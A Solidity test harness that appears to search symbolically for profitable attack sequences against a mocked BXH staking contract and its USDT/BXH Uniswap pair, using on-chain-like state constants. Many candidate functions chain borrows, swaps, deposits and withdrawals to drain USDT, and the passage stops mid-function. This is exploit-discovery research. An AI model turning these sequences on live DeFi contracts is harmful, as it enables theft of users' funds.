// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {AttackContract} from "./AttackContract.sol";
import {BXHStaking} from "./BXHStaking.sol";
import {BXH} from "./BXH.sol";
import {USDT} from "@utils/USDT.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";

contract BXHTest is Test, BlockLoader {
    BXH bxh;
    USDT usdt;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    BXHStaking bxhstaking;
    AttackContract attackContract;
    address owner;
    address attacker;
    address bxhAddr;
    address usdtAddr;
    address pairAddr;
    address factoryAddr;
    address routerAddr;
    address bxhstakingAddr;
    address attackerAddr;
    uint256 blockTimestamp = 1664374995;
    uint112 reserve0pair = 25147468936549224419158;
    uint112 reserve1pair = 150042582869434191452532;
    uint32 blockTimestampLastpair = 1664360756;
    uint256 kLastpair = 3772859961506335396254991567849051167345332565;
    uint256 price0CumulativeLastpair =
        1658542015723059495128658895585784161862152;
    uint256 price1CumulativeLastpair =
        32126006449291447357830235525583796774104;
    uint256 totalSupplybxh = 124962294544563937586572816;
    uint256 balanceOfbxhpair = 150042582869434191452532;
    uint256 balanceOfbxhattacker = 0;
    uint256 balanceOfbxhbxhstaking = 0;
    uint256 totalSupplyusdt = 4979997922170098408283526080;
    uint256 balanceOfusdtpair = 25147468936549224419158;
    uint256 balanceOfusdtattacker = 0;
    uint256 balanceOfusdtbxhstaking = 40030764994324038311630;

    function setUp() public {
        owner = address(this);
        bxh = new BXH();
        bxhAddr = address(bxh);
        usdt = new USDT();
        usdtAddr = address(usdt);
        pair = new UniswapV2Pair(
            address(usdt),
            address(bxh),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        pairAddr = address(pair);
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        factoryAddr = address(factory);
        router = new UniswapV2Router(address(factory), address(0xdead));
        routerAddr = address(router);
        bxhstaking = new BXHStaking(
            address(bxh),
            1 ether,
            block.timestamp,
            1000,
            owner,
            address(usdt),
            address(pair)
        );
        bxhstakingAddr = address(bxhstaking);
        attackContract = new AttackContract();
        attackerAddr = address(attacker);
        attacker = address(attackContract);
        // Initialize balances and mock flashloan.
        usdt.transfer(address(pair), balanceOfusdtpair);
        bxh.transfer(address(pair), balanceOfbxhpair);
        usdt.transfer(address(bxhstaking), balanceOfusdtbxhstaking);
        usdt.transfer(address(bxhstaking), 200000 ether);
    }

    modifier eurus() {
        _;
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Bxh Balances: ");
        queryERC20BalanceDecimals(address(usdt), address(bxh), usdt.decimals());
        queryERC20BalanceDecimals(address(bxh), address(bxh), bxh.decimals());
        emit log_string("");
        emit log_string("Usdt Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(usdt),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(usdt), bxh.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(pair),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(address(bxh), address(pair), bxh.decimals());
        emit log_string("");
        emit log_string("Bxhstaking Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(bxhstaking),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(bxhstaking),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(
            address(usdt),
            address(attacker),
            usdt.decimals()
        );
        queryERC20BalanceDecimals(
            address(bxh),
            address(attacker),
            bxh.decimals()
        );
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
    }

    function borrow_usdt_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_owner(uint256 amount) internal eurus {
        usdt.transfer(owner, amount);
    }

    function borrow_bxh_owner(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(owner);
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bxh_owner(uint256 amount) internal eurus {
        bxh.transfer(owner, amount);
    }

    function borrow_usdt_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        usdt.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_usdt_pair(uint256 amount) internal eurus {
        usdt.transfer(address(pair), amount);
    }

    function borrow_bxh_pair(uint256 amount) internal eurus {
        vm.stopPrank();
        vm.prank(address(pair));
        bxh.transfer(attacker, amount);
        vm.startPrank(attacker);
    }

    function payback_bxh_pair(uint256 amount) internal eurus {
        bxh.transfer(address(pair), amount);
    }

    function swap_pair_attacker_usdt_bxh(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        usdt.transfer(address(pair), amount);
        pair.swap(0, amountOut, attacker, new bytes(0));
    }

    function swap_pair_attacker_bxh_usdt(
        uint256 amount,
        uint256 amountOut
    ) internal eurus {
        bxh.transfer(address(pair), amount);
        pair.swap(amountOut, 0, attacker, new bytes(0));
    }

    function deposit_bxhstaking_bxh_bxhslp(uint256 amount) internal eurus {
        bxh.approve(address(bxhstaking), amount);
        bxhstaking.deposit(0, amount);
    }

    function withdraw_bxhstaking_bxhslp_usdt(uint256 amount) internal eurus {
        bxhstaking.deposit(0, 0);
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        swap_pair_attacker_bxh_usdt(amt3, amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_bxh_owner(amt0);
        swap_pair_attacker_bxh_usdt(amt1, amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        payback_bxh_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        payback_usdt_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        borrow_usdt_pair(amt4);
        withdraw_bxhstaking_bxhslp_usdt(amt5);
        payback_usdt_pair(amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        borrow_bxh_pair(amt4);
        withdraw_bxhstaking_bxhslp_usdt(amt5);
        payback_bxh_pair(amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        swap_pair_attacker_usdt_bxh(amt4, amt5);
        withdraw_bxhstaking_bxhslp_usdt(amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        swap_pair_attacker_bxh_usdt(amt4, amt5);
        withdraw_bxhstaking_bxhslp_usdt(amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_bxh_usdt(amt5, amt6);
        payback_usdt_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt5 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        payback_bxh_owner(amt5);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        borrow_usdt_pair(amt2);
        withdraw_bxhstaking_bxhslp_usdt(amt3);
        payback_usdt_pair(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        payback_bxh_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        borrow_bxh_pair(amt2);
        withdraw_bxhstaking_bxhslp_usdt(amt3);
        payback_bxh_pair(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        payback_bxh_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        swap_pair_attacker_usdt_bxh(amt2, amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        payback_bxh_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt7 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        swap_pair_attacker_bxh_usdt(amt2, amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        payback_bxh_owner(amt7);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        swap_pair_attacker_bxh_usdt(amt3, amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        swap_pair_attacker_bxh_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_bxh_owner(amt0);
        swap_pair_attacker_bxh_usdt(amt1, amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        swap_pair_attacker_bxh_usdt(amt5, amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        payback_bxh_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        swap_pair_attacker_bxh_usdt(amt3, amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand016(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        swap_pair_attacker_bxh_usdt(amt7, amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand017(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_bxh_owner(amt0);
        swap_pair_attacker_bxh_usdt(amt1, amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        deposit_bxhstaking_bxh_bxhslp(amt5);
        withdraw_bxhstaking_bxhslp_usdt(amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        payback_bxh_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand018(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        swap_pair_attacker_bxh_usdt(amt5, amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        payback_bxh_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand019(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        payback_usdt_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand020(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        borrow_usdt_pair(amt4);
        withdraw_bxhstaking_bxhslp_usdt(amt5);
        payback_usdt_pair(amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        deposit_bxhstaking_bxh_bxhslp(amt9);
        withdraw_bxhstaking_bxhslp_usdt(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand021(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt6 >= amt4);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        borrow_bxh_pair(amt4);
        withdraw_bxhstaking_bxhslp_usdt(amt5);
        payback_bxh_pair(amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        deposit_bxhstaking_bxh_bxhslp(amt9);
        withdraw_bxhstaking_bxhslp_usdt(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand022(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        swap_pair_attacker_usdt_bxh(amt4, amt5);
        withdraw_bxhstaking_bxhslp_usdt(amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        deposit_bxhstaking_bxh_bxhslp(amt9);
        withdraw_bxhstaking_bxhslp_usdt(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand023(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        swap_pair_attacker_bxh_usdt(amt4, amt5);
        withdraw_bxhstaking_bxhslp_usdt(amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        deposit_bxhstaking_bxh_bxhslp(amt9);
        withdraw_bxhstaking_bxhslp_usdt(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand024(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt10 >= amt8);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        borrow_usdt_pair(amt8);
        withdraw_bxhstaking_bxhslp_usdt(amt9);
        payback_usdt_pair(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand025(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt10 >= amt8);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        borrow_bxh_pair(amt8);
        withdraw_bxhstaking_bxhslp_usdt(amt9);
        payback_bxh_pair(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand026(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        swap_pair_attacker_usdt_bxh(amt8, amt9);
        withdraw_bxhstaking_bxhslp_usdt(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand027(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        swap_pair_attacker_bxh_usdt(amt8, amt9);
        withdraw_bxhstaking_bxhslp_usdt(amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand028(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_usdt_owner(amt0);
        swap_pair_attacker_usdt_bxh(amt1, amt2);
        deposit_bxhstaking_bxh_bxhslp(amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_bxh_usdt(amt9, amt10);
        payback_usdt_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand029(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt9 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        withdraw_bxhstaking_bxhslp_usdt(amt2);
        swap_pair_attacker_usdt_bxh(amt3, amt4);
        deposit_bxhstaking_bxh_bxhslp(amt5);
        withdraw_bxhstaking_bxhslp_usdt(amt6);
        swap_pair_attacker_usdt_bxh(amt7, amt8);
        payback_bxh_owner(amt9);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand030(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        borrow_usdt_pair(amt2);
        withdraw_bxhstaking_bxhslp_usdt(amt3);
        payback_usdt_pair(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand031(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        vm.assume(amt4 >= amt2);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        borrow_bxh_pair(amt2);
        withdraw_bxhstaking_bxhslp_usdt(amt3);
        payback_bxh_pair(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand032(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_bxh_owner(amt0);
        deposit_bxhstaking_bxh_bxhslp(amt1);
        swap_pair_attacker_usdt_bxh(amt2, amt3);
        withdraw_bxhstaking_bxhslp_usdt(amt4);
        swap_pair_attacker_usdt_bxh(amt5, amt6);
        deposit_bxhstaking_bxh_bxhslp(amt7);
        withdraw_bxhstaking_bxhslp_usdt(amt8);
        swap_pair_attacker_usdt_bxh(amt9, amt10);
        payback_bxh_owner(amt11);
        require(!attackGoal(), "Attack succeed!");
        vm.stopPrank();
    }

    function check_cand033(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8,
        uint256 amt9,
        uint256 amt10,
        uint256 amt11
    ) public {
        vm.startPrank(attacker);
        vm.assume(amt11 >= amt0);
        borrow_bxh_owner(amt0);
